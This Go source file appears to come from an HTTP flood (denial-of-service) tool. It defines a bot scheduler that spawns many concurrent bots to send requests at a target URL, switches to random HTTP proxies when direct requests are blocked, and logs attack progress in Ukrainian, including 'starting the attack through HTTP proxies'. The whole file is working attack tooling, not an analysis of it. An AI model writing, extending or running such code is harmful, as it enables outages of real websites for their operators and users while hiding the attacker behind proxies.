package pkg

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"sync"
	"time"

	log "github.com/sirupsen/logrus"
)

type BotScheduler struct {
	target      Target
	proxies     []Proxy
	onlyProxy   bool
	botsNum     int
	maxErrCount int
}

func NewBotScheduler(target Target, proxies []Proxy, botsNum, maxErrCount int, onlyProxy bool) *BotScheduler {
	if onlyProxy && len(proxies) == 0 {
		panic("no proxy for attack")
	}

	return &BotScheduler{
		target:      target,
		proxies:     proxies,
		onlyProxy:   onlyProxy,
		botsNum:     botsNum,
		maxErrCount: maxErrCount,
	}
}

func (b *BotScheduler) Start(botsCtx context.Context, wg *sync.WaitGroup) error {
	withProxy := true
	getProxy := func() *Proxy {
		if withProxy && len(b.proxies) > 0 {
			return &b.proxies[rand.Intn(len(b.proxies)-1)]
		}

		return nil
	}

	if !b.onlyProxy {
		ctxTimeout, cancel := context.WithTimeout(botsCtx, time.Second*5)
		defer cancel()

		req, err := newReq(ctxTimeout, "GET", b.target.URL)
		if err != nil {
			return fmt.Errorf("on creaing a request: %w", err)
		}

		resp, err := DefClient.Do(req)
		if err != nil {
			log.Warnf("Надсилаючи запит без проксі: %v\n", err)
		} else {
			toDevNull(resp.Body)
		}

		if (err != nil || resp.StatusCode != http.StatusOK) && len(b.proxies) > 0 {
			log.Infoln("Починаємо атаку через HTTP проксі :)")
		} else {
			withProxy = false
		}
	}

	botsCtx, termBots := context.WithCancel(botsCtx)
	msgs := make(chan BotMsg, b.botsNum)

	// TODO: handle errors && and  statisics
	for i := 0; i < b.botsNum; i++ {
		select {
		case <-botsCtx.Done():
			termBots() // To free resources
			return nil
		default:
			go func() {
				id := rand.Int() // TODO: possible collisions
				log := log.WithField("bot", id)

				c, err := NewBot(id, getProxy)
				if err != nil {
					log.Infof("Під час створення бота: %v\n", err)
					return
				}

				wg.Add(1)
				c.Start(botsCtx, b.target.URL, msgs)
				wg.Done()
			}()
		}
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		b.botListener(botsCtx, termBots, msgs)
	}()

	return nil
}

func (b *BotScheduler) botListener(ctx context.Context, termBots func(), msgs <-chan BotMsg) {
	totalRequstSent, successRequestSent := 0, 0
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		select {
		case <-ctx.Done():
			return
		case msg := <-msgs:
			totalRequstSent++
			if msg.Err != nil {
				log.WithField("id", msg.ID).Errorln(msg.Err)
			} else {
				log.WithField("id", msg.ID).Infof("[200] %s", b.target.URL)
				successRequestSent++
			}

			if msg.ErrCount > b.maxErrCount {
				msg.Continue <- false

				log.WithField("id", msg.ID).Warnf(
					"Бот закінчив роботу; к-сть помилка перевищила ліміт %d",
					b.maxErrCount,
				)
			}

			msg.Continue <- true

			if totalRequstSent%500 == 0 {
				log.Infof("Успішних запитів: %d/%d\n", successRequestSent, totalRequstSent)
			}
		}
	}
}
